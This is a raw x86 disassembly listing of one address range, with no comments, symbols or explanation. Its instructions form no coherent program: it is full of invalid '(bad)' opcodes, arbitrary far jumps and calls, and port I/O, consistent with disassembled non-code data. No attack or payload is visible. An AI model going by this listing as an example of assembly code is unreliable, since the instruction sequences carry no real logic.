  424ec7:	neg    BYTE PTR [ecx+esi*1]
  424eca:	push   esp
  424ecb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ecc:	or     edi,ebp
  424ece:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ecf:	cli    
  424ed0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ed1:	mov    dh,0x33
  424ed3:	fcomp  QWORD PTR [edi+0x2d]
  424ed6:	mov    ds:0xdf2a52db,al
  424edb:	xor    BYTE PTR [edi],0x26
  424ede:	jmp    0xbea8:0x6170306e
  424ee5:	mov    DWORD PTR [esi-0x42],esi
  424ee8:	push   cs
  424ee9:	sti    
  424eea:	xchg   BYTE PTR [edi],bl
  424eec:	je     0x424ef6
  424eee:	mov    DWORD PTR [ecx-0x5377af63],edx
  424ef4:	pop    ecx
  424ef5:	repnz and dl,BYTE PTR [edi-0x3812999c]
  424efc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424efd:	popa   
  424efe:	and    al,0x3a
  424f00:	adc    al,0x40
  424f02:	aaa    
  424f03:	fs push ecx
  424f05:	cli    
  424f06:	push   ebx
  424f07:	imul   esp,DWORD PTR [eax-0x39]
  424f0b:	pop    edx
  424f0c:	fst    QWORD PTR [ebp+0x18]
  424f0f:	pop    ebx
  424f10:	xor    al,0xea
  424f12:	enter  0x5bb2,0xa1
  424f16:	dec    esi
  424f17:	in     al,dx
  424f18:	clc    
  424f19:	test   al,0x5a
  424f1b:	mov    WORD PTR [ecx+edx*2-0x20],gs
  424f1f:	out    0x27,al
  424f21:	popf   
  424f22:	jg     0x424f19
  424f24:	inc    ecx
  424f25:	lahf   
  424f26:	jae    0x424fa3
  424f28:	mov    al,0x40
  424f2a:	xchg   ecx,eax
  424f2b:	adc    eax,eax
  424f2d:	jns    0x424f44
  424f2f:	adc    BYTE PTR ds:0x6ce712dd,dh
  424f35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424f36:	mov    al,0xec
  424f38:	cmc    
  424f39:	xchg   edi,eax
  424f3a:	cwde   
  424f3b:	fild   WORD PTR [ecx-0x50]
  424f3e:	daa    
  424f3f:	lods   al,BYTE PTR ds:[esi]
  424f40:	dec    ebx
  424f41:	es lahf 
  424f43:	inc    esp
  424f44:	adc    al,0xc7
  424f46:	in     eax,dx
  424f47:	in     eax,dx
  424f48:	cmp    al,0xe
  424f4a:	xchg   DWORD PTR [ecx-0x1e],ecx
  424f4d:	mov    ecx,0xe228843e
  424f52:	xchg   esp,eax
  424f53:	nop
  424f54:	js     0x424fd0
  424f56:	out    dx,al
  424f57:	cmc    
  424f58:	ja     0x424f51
  424f5a:	retf   
  424f5b:	fwait
  424f5c:	and    esp,DWORD PTR [esi-0x12]
  424f5f:	lds    ebx,FWORD PTR [edi+0x5974fc57]
  424f65:	sub    BYTE PTR [edi],al
  424f67:	sbb    eax,0x6fd66e8e
  424f6c:	push   ss
  424f6d:	sub    eax,0x86b1c490
  424f72:	xchg   ebp,eax
  424f73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f74:	call   0xa74ce26b
  424f79:	rol    BYTE PTR [ebp-0x4e7e9f2f],1
  424f7f:	pop    edi
  424f80:	sbb    edi,edx
  424f82:	fisub  DWORD PTR [ebx+eiz*8-0x21]
  424f86:	fist   DWORD PTR [ecx]
  424f88:	mov    WORD PTR [esi-0x1f58a68b],?
  424f8e:	xchg   edi,eax
  424f8f:	inc    edx
	...
  424ff4:	dec    ebx
  424ff5:	push   ss
  424ff6:	int    0x41
  424ff8:	fstp   st(3)
  424ffa:	iret   
  424ffb:	push   ds
  424ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ffd:	fadd   st(3),st
  424fff:	dec    eax
  425000:	xlat   BYTE PTR ds:[ebx]
  425001:	fmul   QWORD PTR [edx-0x80]
  425004:	mov    ah,0x8a
  425006:	add    DWORD PTR [eax],eax
  425008:	add    al,0x1
  42500a:	add    BYTE PTR [eax],al
  42500c:	adc    eax,0x8c963b96
  425011:	outs   dx,BYTE PTR ds:[esi]
  425012:	jnp    0x425085
  425014:	mov    al,ds:0xc3f47879
  425019:	dec    edx
  42501a:	outs   dx,BYTE PTR ds:[esi]
  42501b:	or     ch,bh
  42501d:	sub    edi,DWORD PTR ss:[edx+0xc]
  425021:	pop    ebp
  425022:	sbb    esi,DWORD PTR [ebp-0x4071799e]
  425028:	and    esp,ebx
  42502a:	xchg   edi,eax
  42502b:	mov    al,0xa2
  42502d:	fdivrp st(6),st
  42502f:	outs   dx,DWORD PTR ds:[esi]
  425030:	pop    ss
  425031:	xor    ebx,DWORD PTR [eax]
  425033:	test   eax,0xd96aa17d
  425038:	pop    ds
  425039:	lods   eax,DWORD PTR gs:[esi]
  42503b:	inc    esi
  42503c:	fimul  WORD PTR [edx]
  42503e:	dec    esi
  42503f:	push   es
  425040:	inc    ecx
  425041:	mov    ds:0x95c81811,al
  425046:	xchg   BYTE PTR [edx],bh
  425048:	sti    
  425049:	or     ebp,DWORD PTR [edi+0x7e]
  42504c:	dec    ecx
  42504d:	loopne 0x424ff1
  42504f:	add    BYTE PTR [edi-0x38],dh
  425052:	xchg   ebx,eax
  425053:	fisttp WORD PTR [ebx-0x5aaee84a]
  425059:	fs jbe 0x425030
  42505c:	and    eax,0xfb3f5c8c
  425061:	mov    ebp,0x367cd68c
  425066:	cmp    edi,DWORD PTR [ebx]
  425068:	push   ebp
  425069:	data16 aam 0xdc
  42506c:	cmp    DWORD PTR [ebx+0x2ed9bb50],0x44
  425073:	ds jbe 0x425020
  425076:	or     dl,BYTE PTR [ebx-0x63]
  425079:	dec    eax
  42507a:	sbb    esp,DWORD PTR [ecx+0x35]
  42507d:	mov    ds:0x4b90a283,al
  425082:	scas   al,BYTE PTR es:[edi]
  425083:	aam    0x13
  425085:	ja     0x4250ed
  425087:	lods   eax,DWORD PTR ds:[esi]
  425088:	push   esi
  425089:	test   DWORD PTR [edi],edi
  42508b:	mov    bh,BYTE PTR [edi+0x26281b3b]
  425091:	ja     0x425099
  425093:	stos   BYTE PTR es:[edi],al
  425094:	sbb    esp,DWORD PTR [ecx-0x6430d899]
  42509a:	call   DWORD PTR [edx+0x40]
  42509d:	mov    edi,0x921b12f7
  4250a2:	mov    ch,0xe9
  4250a4:	jnp    0x42506f
  4250a6:	outs   dx,DWORD PTR ds:[esi]
  4250a7:	rol    BYTE PTR [eax],1
  4250a9:	stos   DWORD PTR es:[edi],eax
  4250aa:	mov    ds:0x553736c7,al
  4250af:	pop    ecx
  4250b0:	sub    BYTE PTR [ebx],bl
  4250b2:	add    cl,BYTE PTR ds:0x42ab22c6
  4250b8:	and    dh,BYTE PTR [esi+0x217bddb9]
  4250be:	stos   BYTE PTR es:[edi],al
  4250bf:	sbb    DWORD PTR [eax-0x4c],esp
  4250c2:	ins    DWORD PTR es:[edi],dx
  4250c3:	data16 loope 0x425090
  4250c6:	pop    ebx
  4250c7:	and    dh,bl
  4250c9:	loop   0x4250f0
  4250cb:	mov    ds:0x600813d0,eax
  4250d0:	sub    ch,ah
  4250d2:	ins    BYTE PTR es:[edi],dx
  4250d3:	(bad)  
  4250d4:	fld    DWORD PTR [eax]
  4250d6:	mov    eax,ds:0x87014bb2
  4250db:	mov    al,ds:0xecfffe85
  4250e0:	jge    0x425072
  4250e2:	jmp    0x4250ef
  4250e4:	call   0xf8c1:0xee0c51af
  4250eb:	mov    eax,0x43c7a3c9
  4250f0:	inc    ecx
  4250f1:	loope  0x425168
  4250f3:	mov    ch,0xc
  4250f5:	cdq    
  4250f6:	repz mov dh,0xd7
  4250f9:	adc    al,0x49
  4250fb:	shr    DWORD PTR [edi-0x1e],0x1a
  4250ff:	add    BYTE PTR [ebp+0x2a69fdc5],bh
  425105:	add    DWORD PTR ds:0x59347dd0,edi
  42510b:	ins    DWORD PTR es:[edi],dx
  42510c:	mov    ebx,0xbacc31
	...
  425171:	add    BYTE PTR [eax],al
  425173:	add    dh,bl
  425175:	adc    DWORD PTR [edi-0x15020dd],ebx
  42517b:	std    
  42517c:	out    dx,al
  42517d:	jmp    0x6ebf:0xc5c392e8
  425184:	mov    eax,0x400018b
  425189:	add    DWORD PTR [eax],eax
  42518b:	add    BYTE PTR [ebx-0x66889c22],cl
  425191:	add    bh,al
  425193:	sub    DWORD PTR [ecx-0x31],ebp
  425196:	jo     0x4251d5
  425198:	iret   
  425199:	add    BYTE PTR [esi],ah
  42519b:	mov    dl,0x7
  42519d:	in     al,0xc6
  42519f:	jl     0x4251b6
  4251a1:	lods   eax,DWORD PTR ds:[esi]
  4251a2:	hlt    
  4251a3:	test   BYTE PTR [eax],ch
  4251a5:	mov    edx,edx
  4251a7:	lods   eax,DWORD PTR ds:[esi]
  4251a8:	xchg   edi,eax
  4251a9:	pushf  
  4251aa:	fcmovbe st,st(3)
  4251ac:	jle    0x4251e4
  4251ae:	push   edi
  4251af:	mov    bl,0xd0
  4251b1:	sbb    esp,DWORD PTR ds:0x5e22abeb
  4251b8:	icebp  
  4251b9:	dec    dx
  4251bb:	mov    WORD PTR [edi-0x2b],cs
  4251be:	mov    bl,0xf9
  4251c0:	or     eax,0xac01dc7c
  4251c5:	jmp    0xcb97:0x1f0ffd1
  4251cc:	sahf   
  4251cd:	das    
  4251ce:	xchg   esp,eax
  4251cf:	or     BYTE PTR [edx+esi*2],cl
  4251d2:	shl    DWORD PTR [esi+0x32],cl
  4251d5:	ins    BYTE PTR es:[edi],dx
  4251d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4251d7:	data16 cmp ah,dl
  4251da:	or     al,0x89
  4251dc:	add    BYTE PTR [eax-0x5e7cc82f],dl
  4251e2:	cmp    BYTE PTR [edi-0x3e],bl
  4251e5:	cs mov eax,0xa8c5ba72
  4251eb:	hlt    
  4251ec:	fmulp  st(4),st
  4251ee:	enter  0xe158,0xfb
  4251f2:	sbb    ebp,DWORD PTR [edi]
  4251f4:	xor    al,0x8c
  4251f6:	gs push edi
  4251f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4251f9:	outs   dx,BYTE PTR ds:[esi]
  4251fa:	sbb    dh,dh
  4251fc:	adc    al,0xb4
  4251fe:	adc    ebx,esi
  425200:	dec    esi
  425201:	mov    ebx,0xa4977123
  425206:	lea    esi,[ecx*1+0x52295be1]
  42520d:	mov    WORD PTR [eax+0x11057beb],?
  425213:	xor    ah,BYTE PTR [edi]
  425215:	into   
  425216:	jg     0x425246
  425218:	mov    bl,0x9d
  42521a:	into   
  42521b:	(bad)  
  42521c:	int3   
  42521d:	cmp    eax,DWORD PTR [edi]
  42521f:	cdq    
  425220:	adc    DWORD PTR [eax+ebx*8+0x7caf968d],edi
  425227:	lods   eax,DWORD PTR ds:[esi]
  425228:	mov    ebp,0xe84389d6
  42522d:	int    0x6
  42522f:	(bad)  
  425230:	aaa    
  425231:	mov    edi,0xd5d5f9b1
  425236:	ret    0x8c1a
  425239:	ret    0xf64a
  42523c:	sbb    ch,BYTE PTR [ebp+0x7183c2ab]
  425242:	or     BYTE PTR [eax+edi*2],0x99
  425246:	call   0x59b3:0x775a0a02
  42524d:	inc    esi
  42524e:	mov    edx,0xb78b9702
  425253:	add    eax,0x262a9748
  425258:	(bad)  
  425259:	outs   dx,BYTE PTR ds:[esi]
  42525a:	daa    
  42525b:	inc    ebp
  42525c:	push   gs
  42525e:	shl    eax,cl
  425260:	or     BYTE PTR [ecx+0x257a8bc9],dh
  425266:	bnd jle 0x425295
  425269:	fsubr  QWORD PTR [ebx]
  42526b:	push   es
  42526c:	mov    ecx,0x1b792a97
  425271:	mov    al,ds:0x772e9731
  425276:	sbb    BYTE PTR [eax-0x1e],dl
  425279:	rol    BYTE PTR [ecx],0x52
  42527c:	and    ecx,esp
  42527e:	sub    eax,0x3dd853ee
  425283:	jle    0x425258
  425285:	cmp    al,0xbd
  425287:	stos   DWORD PTR es:[edi],eax
  425288:	push   eax
  425289:	pop    ebx
  42528a:	(bad)  
  42528b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42528c:	or     eax,0x5a0ff8
	...
  4252f1:	add    BYTE PTR [eax],al
  4252f3:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  4252fa:	mov    ebp,0x45495ee6
  4252ff:	icebp  
  425300:	ret    
  425301:	xchg   ebp,eax
  425302:	mov    ecx,0x18cbcf9
  425307:	add    BYTE PTR [ecx+eax*1],al
  42530a:	add    BYTE PTR [eax],al
  42530c:	pop    ecx
  42530d:	and    BYTE PTR [ecx],bl
  42530f:	ret    
  425310:	and    al,0xd2
  425312:	cmp    DWORD PTR [ebx],esp
  425314:	add    BYTE PTR [ebx-0x32a0fbbf],bl
  42531a:	loop   0x4252de
  42531c:	fcom   DWORD PTR [edx]
  42531e:	jnp    0x4252cf
  425320:	dec    edx
  425321:	in     al,0xc4
  425323:	movaps xmm2,xmm2
  425326:	xlat   BYTE PTR ds:[ebx]
  425327:	shl    al,cl
  425329:	adc    BYTE PTR [ecx+0xad908a8],dh
  42532f:	pushf  
  425330:	loope  0x4252f4
  425332:	xor    eax,0x60070e16
  425337:	or     dl,BYTE PTR [edi-0x7c]
  42533a:	inc    ebx
  42533b:	mov    ss,WORD PTR [ebp-0x78]
  42533e:	adc    DWORD PTR [ebp-0x45810dc1],eax
  425344:	push   cs
  425345:	push   edi
  425346:	xchg   edi,eax
  425347:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425348:	test   al,0x33
  42534a:	inc    esp
  42534b:	xchg   esp,eax
  42534c:	test   BYTE PTR [esi-0x566a40b4],dl
  425352:	stc    
  425353:	pusha  
  425354:	xchg   esi,eax
  425355:	xchg   esi,eax
  425356:	fld    DWORD PTR [eax+0x6c]
  425359:	mov    edi,0x443528e4
  42535e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42535f:	push   esi
  425360:	pop    esi
  425361:	sub    edi,ebx
  425363:	lods   al,BYTE PTR ds:[esi]
  425364:	lahf   
  425365:	daa    
  425366:	mov    esp,0x5e6c9a55
  42536b:	sbb    al,dh
  42536d:	cmp    cl,BYTE PTR [esp+ebp*8+0x77345995]
  425374:	scas   al,BYTE PTR es:[edi]
  425375:	pop    ecx
  425376:	xchg   edi,eax
  425377:	fdiv   QWORD PTR [ecx+0x6d]
  42537a:	dec    eax
  42537b:	xor    BYTE PTR [ebp+0x41],dh
  42537e:	mov    esp,0xea334b0c
  425383:	(bad)  
  425384:	fnstsw WORD PTR [ebp+0x2196778d]
  42538a:	cli    
  42538b:	(bad)  
  42538c:	je     0x425352
  42538e:	dec    ebp
  42538f:	or     esp,DWORD PTR [esi+0x72d0fe01]
  425395:	fimul  DWORD PTR [ecx+0x49a1b764]
  42539b:	mov    ebx,0x317af8af
  4253a0:	or     al,0x24
  4253a2:	xchg   esi,eax
  4253a3:	pop    edi
  4253a4:	retf   0xed1c
  4253a7:	pop    ss
  4253a8:	sub    esi,DWORD PTR [ecx+0x11]
  4253ab:	add    esp,DWORD PTR [ebx+0x49]
  4253ae:	imul   DWORD PTR [edx+ebx*1+0x6b6f4b7c]
  4253b5:	adc    eax,0xbbe6af71
  4253ba:	daa    
  4253bb:	daa    
  4253bc:	dec    esp
  4253bd:	mov    esi,DWORD PTR [edx]
  4253bf:	jb     0x425422
  4253c1:	idiv   bl
  4253c3:	mov    ds:0xcd72521a,eax
  4253c8:	loope  0x425369
  4253ca:	pusha  
  4253cb:	test   BYTE PTR [eax+0x37],0xaf
  4253cf:	popf   
  4253d0:	sbb    BYTE PTR [ecx-0x62],0x87
  4253d4:	cmp    BYTE PTR [ecx+0x7],ah
  4253d7:	out    0x98,al
  4253d9:	out    0xe2,al
  4253db:	aam    0xc4
  4253dd:	mov    ecx,0x7c87cbe9
  4253e2:	xor    eax,0x71277857
  4253e7:	inc    eax
  4253e8:	add    al,0x8
  4253ea:	loop   0x4253b7
  4253ec:	int    0x84
  4253ee:	repnz pusha 
  4253f0:	jb     0x4253b9
  4253f2:	das    
  4253f3:	adc    bh,BYTE PTR [esi]
  4253f5:	adc    DWORD PTR [ebp+0x32df9d4e],esp
  4253fb:	(bad)  
  4253fc:	fild   QWORD PTR [eax+0xc8364f]
  425402:	mov    ebx,0xab34890a
  425407:	fldcw  WORD PTR [ecx+ebx*2+0x76326964]
  42540e:	and    eax,DWORD PTR [ebx+0x0]
	...
  425474:	inc    edx
  425475:	or     esp,eax
  425477:	test   eax,0xeb6fedcf
  42547c:	fcomp  DWORD PTR [edx]
  42547f:	add    esi,eax
  425481:	ror    BYTE PTR [edx+0x18dc04f],cl
  425487:	add    BYTE PTR [ecx+eax*1],al
  42548a:	add    BYTE PTR [eax],al
  42548c:	sub    edi,DWORD PTR [ecx+0x323b4272]
  425492:	es jl  0x425495
  425495:	push   ecx
  425496:	loope  0x4254c8
  425498:	dec    ebx
  425499:	mov    ebp,0x3d6f370b
  42549e:	mov    cl,BYTE PTR [esi+0x14]
  4254a1:	ins    BYTE PTR es:[edi],dx
  4254a2:	or     ebp,DWORD PTR ds:0x5baf264b
  4254a8:	dec    edx
  4254a9:	mov    al,0xc4
  4254ab:	(bad)  
  4254ad:	test   DWORD PTR [ebx-0x756a27ca],edx
  4254b3:	and    bl,BYTE PTR [edx+0x4cd92ab6]
  4254b9:	test   DWORD PTR [edi-0x7a2dc5a4],0x5cfcf6eb
  4254c3:	xchg   edi,eax
  4254c4:	adc    edi,edx
  4254c6:	sub    eax,0xa4a2d7be
  4254cb:	or     BYTE PTR [ebx],ah
  4254cd:	fadd   DWORD PTR [esp+ebp*2+0x1ad69722]
  4254d4:	out    dx,eax
  4254d5:	jo     0x4254ce
  4254d7:	popa   
  4254d8:	imul   ebp,DWORD PTR [esi+0x31953c9b],0xa
  4254df:	mov    ecx,0x25954599
  4254e4:	jl     0x425530
  4254e6:	sub    al,0xb0
  4254e8:	jb     0x4254d0
  4254ea:	cmc    
  4254eb:	ds adc al,0x2e
  4254ee:	scas   al,BYTE PTR es:[edi]
  4254ef:	(bad)  
  4254f0:	fiadd  WORD PTR [eax-0x3e]
  4254f3:	dec    ecx
  4254f4:	adc    DWORD PTR [eax-0x4],ebp
  4254f7:	fwait
  4254f8:	lahf   
  4254f9:	int3   
  4254fa:	std    
  4254fb:	cmp    BYTE PTR [ecx+0x2],dl
  4254fe:	and    esi,edi
  425500:	inc    edx
  425501:	cli    
  425502:	pop    es
  425503:	icebp  
  425504:	xor    eax,0x4aba132f
  425509:	scas   al,BYTE PTR es:[edi]
  42550a:	and    al,0x1c
  42550c:	mov    BYTE PTR [ebp+0x69],0x2e
  425510:	adc    ax,0x7edd
  425514:	aad    0x84
  425516:	mov    ds:0x63053349,eax
  42551b:	sar    DWORD PTR [esi-0x3c],1
  42551e:	inc    ebx
  42551f:	bound  esi,QWORD PTR [ebx+0x6aa4aae]
  425525:	or     DWORD PTR [ebp+0x15be9bde],esi
  42552b:	shl    DWORD PTR [esi+edx*4],cl
  42552e:	in     al,dx
  42552f:	les    ebx,FWORD PTR [ebx]
  425531:	mov    al,ds:0x88cdc71c
  425536:	repz out dx,al
  425538:	lods   al,BYTE PTR ds:[esi]
  425539:	pushf  
  42553a:	fcmove st,st(6)
  42553c:	push   ds
  42553d:	push   edx
  42553e:	rol    DWORD PTR [ebx+0x73032a2],cl
  425544:	adc    al,0x82
  425546:	(bad)  
  425547:	pop    eax
  425548:	test   al,0xe8
  42554a:	add    BYTE PTR [edx+0x78],ah
  42554d:	call   0x9605:0xa1b5d61d
  425554:	adc    DWORD PTR [esi+esi*4],edi
  425557:	xchg   ebx,eax
  425558:	outs   dx,BYTE PTR ds:[esi]
  425559:	ss cmp esp,ebp
  42555c:	add    eax,0xdeb11180
  425561:	xchg   esp,edi
  425563:	mov    eax,0x1a82a022
  425568:	aaa    
  425569:	jae    0x4255a9
  42556b:	out    0xde,al
  42556d:	inc    esp
  42556e:	xchg   edx,eax
  42556f:	fstp   QWORD PTR [eax-0x55]
  425572:	in     eax,dx
  425573:	pop    ss
  425574:	sahf   
  425575:	stc    
  425576:	jns    0x42553d
  425578:	in     eax,dx
  425579:	adc    edx,ecx
  42557b:	fstp   DWORD PTR [ebp-0x9f6884c]
  425581:	out    dx,eax
  425582:	enter  0x6b44,0x9c
  425586:	jmp    0xfa55:0x29aadabb
  42558d:	push   eax
  42558e:	ficom  DWORD PTR [ebx+0x0]
	...
  4255f4:	(bad)  
  4255f5:	jmp    0xfef4:0xfe6e7a4e
  4255fc:	dec    ebp
  4255fd:	mov    esi,0x8b2ff13a
  425602:	jle    0x425586
  425604:	les    ecx,FWORD PTR [esi+0x1040001]
  42560a:	add    BYTE PTR [eax],al
  42560c:	jmp    0x4255ce
  42560e:	fld    QWORD PTR [ecx-0x57]
  425611:	and    dh,dl
  425613:	(bad)  
  425614:	add    eax,0x88b0f342
  425619:	jne    0x425608
  42561b:	push   0xffffff82
  42561d:	sbb    DWORD PTR [edx+eiz*1],edx
  425620:	cmp    edx,esi
  425622:	mov    ds:0xa309f513,eax
  425627:	xchg   edi,eax
  425628:	mov    ebp,DWORD PTR [ebp+0x67d29221]
  42562e:	pusha  
  42562f:	ins    DWORD PTR es:[edi],dx
  425630:	mov    al,ds:0x89081e1f
  425635:	xor    bp,di
  425638:	pop    ecx
  425639:	mov    edx,0x614015fd
  42563e:	popa   
  42563f:	ds rcr ebp,1
  425642:	push   ebp
  425643:	xor    eax,0xa39ef9bf
  425648:	push   edx
  425649:	inc    ebp
  42564a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42564b:	add    eax,0x29785cce
  425650:	add    DWORD PTR [edi],esp
  425652:	dec    ebp
  425653:	inc    ebp
  425654:	sub    ah,BYTE PTR [ecx+0x337b8705]
  42565a:	pop    eax
  42565b:	out    0xc8,eax
  42565d:	mov    esp,0x285531c5
  425662:	mov    eax,ds:0x2fa44b64
  425667:	or     BYTE PTR [eax+0x4cdff4f4],0xea
  42566e:	je     0x4255f5
  425670:	sti    
  425671:	and    cl,BYTE PTR [eax+ebp*4+0x63]
  425675:	loop   0x425629
  425677:	or     eax,DWORD PTR [edx+ebp*2-0x3b874861]
  42567e:	push   eax
  42567f:	out    0x4d,eax
  425681:	fist   WORD PTR [ebx]
  425683:	ds clc 
  425685:	leave  
  425686:	hlt    
  425687:	mov    WORD PTR [ecx-0x364ffda4],fs
  42568d:	pop    edx
  42568e:	cmp    ecx,edx
  425690:	std    
  425691:	aam    0x42
  425693:	and    ch,BYTE PTR [edx+eiz*4-0x6c]
  425697:	jecxz  0x4256da
  425699:	jle    0x4256b3
  42569b:	aam    0x46
  42569d:	shrd   DWORD PTR [esi],esi,cl
  4256a0:	pop    ds
  4256a1:	in     al,dx
  4256a2:	mov    ah,0xce
  4256a4:	popf   
  4256a5:	sub    eax,0x2c3470eb
  4256aa:	or     al,0xa8
  4256ac:	ja     0x42562e
  4256ae:	pop    edi
  4256af:	sub    esp,DWORD PTR [edx]
  4256b1:	rcr    BYTE PTR [esi],1
  4256b3:	cvtpi2ps xmm0,mm6
  4256b6:	mov    edx,0x9bb03be9
  4256bb:	mov    ds:0x9d08f5e4,al
  4256c0:	js     0x4256c6
  4256c2:	(bad)  
  4256c3:	jb     0x4256c2
  4256c5:	push   edx
  4256c6:	addr16 test ah,dl
  4256c9:	mov    edx,0x89f5b115
  4256ce:	xchg   edi,eax
  4256cf:	pop    eax
  4256d0:	jno    0x42571d
  4256d2:	or     al,BYTE PTR [eax+eax*1]
  4256d5:	lea    esi,ds:0x836ef4e6
  4256db:	mov    bh,0x18
  4256dd:	dec    ebx
  4256de:	(bad)  
  4256df:	pop    ds
  4256e0:	mov    ah,0x4
  4256e2:	xor    BYTE PTR [edx],0x8f
  4256e5:	(bad)  
  4256e7:	idiv   BYTE PTR [ebp+0x1a2c8d2]
  4256ed:	xchg   ebx,eax
  4256ee:	test   DWORD PTR ds:0x1898e5f0,edx
  4256f4:	fcom   QWORD PTR [ebx+eax*1]
  4256f7:	fist   WORD PTR [eax]
  4256f9:	sahf   
  4256fa:	mov    ecx,0x68ebad1
  4256ff:	shl    BYTE PTR [edx],1
  425701:	push   edi
  425702:	push   ss
  425703:	xor    bh,al
  425705:	outs   dx,BYTE PTR ds:[esi]
  425706:	add    dl,BYTE PTR [edx]
  425708:	nop
  425709:	or     dh,al
  42570b:	cdq    
  42570c:	push   ebx
  42570d:	inc    ebp
  42570e:	mov    edi,0x47
	...
  425773:	add    dh,dl
  425775:	aaa    
  425776:	shl    BYTE PTR [ebx+esi*8],cl
  425779:	cmc    
  42577a:	div    bh
  42577c:	test   DWORD PTR [edi+0x3f],0x27a43e74
  425783:	inc    esi
  425784:	enter  0x18f,0x0
  425788:	add    al,0x1
  42578a:	add    BYTE PTR [eax],al
  42578c:	out    0xf8,eax
  42578e:	int    0x85
  425790:	in     eax,dx
  425791:	mov    ebp,?
  425793:	mov    dl,0x9a
  425795:	mov    al,ds:0x8a43de3
  42579a:	test   BYTE PTR [eax],cl
  42579c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42579d:	loop   0x425768
  42579f:	aad    0xc5
  4257a1:	fimul  DWORD PTR [edi]
  4257a3:	add    edi,DWORD PTR [edx-0x67e94929]
  4257a9:	xchg   dh,bh
  4257ab:	pop    ecx
  4257ac:	pop    ds
  4257ad:	ds push esi
  4257af:	rcr    BYTE PTR [esi-0x6e],0xf
  4257b3:	mov    bl,0x62
  4257b5:	dec    eax
  4257b6:	aas    
  4257b7:	add    al,0x1f
  4257b9:	adc    ch,BYTE PTR [edx+ebp*4+0x43]
  4257bd:	and    edi,DWORD PTR [edi+0x55a0b6b7]
  4257c3:	in     eax,0xc6
  4257c5:	mov    ds:0x5421a67a,al
  4257ca:	mov    ecx,0xf2db0e6d
  4257cf:	test   BYTE PTR [eax+0x58],0xd1
  4257d3:	and    al,0xb
  4257d5:	cmp    al,0x56
  4257d7:	loopne 0x4257e3
  4257d9:	mov    ecx,0x2e29a080
  4257de:	mul    ch
  4257e0:	nop
  4257e1:	mov    cl,0x17
  4257e3:	pop    ds
  4257e4:	xchg   edx,eax
  4257e5:	inc    edx
  4257e6:	repz push edi
  4257e8:	stc    
  4257e9:	pop    esp
  4257ea:	enter  0x870d,0x2f
  4257ee:	scas   eax,DWORD PTR es:[edi]
  4257ef:	out    0xc2,eax
  4257f1:	call   0x3055178b
  4257f6:	sbb    eax,0x3f4536ae
  4257fb:	mov    DWORD PTR [esi-0x3179ce16],esi
  425801:	add    eax,DWORD PTR [ecx+0x24d69ca5]
  425807:	fwait
  425808:	stos   DWORD PTR es:[edi],eax
  425809:	fild   QWORD PTR [ecx]
  42580b:	cmp    dl,al
  42580d:	jns    0x4257da
  42580f:	mul    DWORD PTR [ebx-0x77]
  425812:	in     eax,0xcb
  425814:	fstp   TBYTE PTR [ebx-0x14]
  425817:	stos   DWORD PTR es:[edi],eax
  425818:	pop    es
  425819:	fdivr  DWORD PTR [ecx]
  42581b:	fdivr  QWORD PTR [edi-0x4c]
  42581e:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  425820:	test   eax,0xf8489a4c
  425825:	jmp    0x42584c
  425827:	adc    DWORD PTR [ecx+0x3c434dd3],eax
  42582d:	test   al,0xa2
  42582f:	ss jmp 0x4257ff
  425832:	xchg   edx,eax
  425833:	repz push edx
  425835:	sahf   
  425836:	test   DWORD PTR [ecx+0x6e],esi
  425839:	retf   0xdbfc
  42583c:	popa   
  42583d:	sbb    eax,0xdf397282
  425842:	inc    eax
  425843:	jmp    DWORD PTR [edx]
  425845:	pop    eax
  425846:	inc    edi
  425847:	rcl    BYTE PTR [edx-0x5f],cl
  42584a:	pop    edi
  42584b:	mov    al,0xf3
  42584d:	fs leave 
  42584f:	pop    esp
  425850:	sbb    esp,DWORD PTR [ecx+0x5b1f4625]
  425856:	int3   
  425857:	push   es
  425858:	sbb    DWORD PTR ds:0x3d0c54c0,0xffffff9c
  42585f:	push   eax
  425860:	cs dec esp
  425862:	gs ss stos BYTE PTR es:[edi],al
  425865:	sti    
  425866:	inc    ecx
  425867:	ins    DWORD PTR es:[edi],dx
  425868:	out    dx,eax
  425869:	mov    al,ds:0xc14afaf4
  42586e:	(bad)  
  42586f:	mov    ah,0x7
  425871:	xor    ebp,esp
  425873:	inc    eax
  425874:	mov    esi,0xd72bfd2e
  425879:	mov    edi,es
  42587b:	lds    esp,FWORD PTR [eax-0x40]
  42587e:	inc    edx
  42587f:	mov    cl,0x53
  425881:	push   0xffffffbe
  425883:	push   0xffffff95
  425885:	or     ah,BYTE PTR [ebx-0x70572e3d]
  42588b:	imul   esi,DWORD PTR [eax],0x7b
  42588e:	add    esp,ecx
	...
  4258f4:	pop    esp
  4258f5:	push   edx
  4258f6:	nop
  4258f7:	push   edx
  4258f8:	sahf   
  4258f9:	rcr    dh,cl
  4258fb:	pop    esi
  4258fc:	adc    BYTE PTR [edx+0x55],0x71
  425900:	pop    es
  425901:	pop    esp
  425902:	dec    esp
  425903:	inc    edx
  425904:	int3   
  425905:	nop
  425906:	add    DWORD PTR [eax],eax
  425908:	add    al,0x1
  42590a:	add    BYTE PTR [eax],al
  42590c:	inc    eax
  42590d:	cld    
  42590e:	mov    bl,0x19
  425910:	and    bh,BYTE PTR [edi+0x2b]
  425913:	(bad)  
  425914:	fwait
  425915:	ret    0xb551
  425918:	push   0xffffff81
  42591a:	push   edx
  42591b:	mov    al,BYTE PTR [edi+0x4d]
  42591e:	in     eax,0x9e
  425920:	lods   al,BYTE PTR ds:[esi]
  425921:	jle    0x425982
  425923:	xchg   ebp,eax
  425924:	fwait
  425925:	call   0xfd455e55
  42592a:	sbb    bh,dl
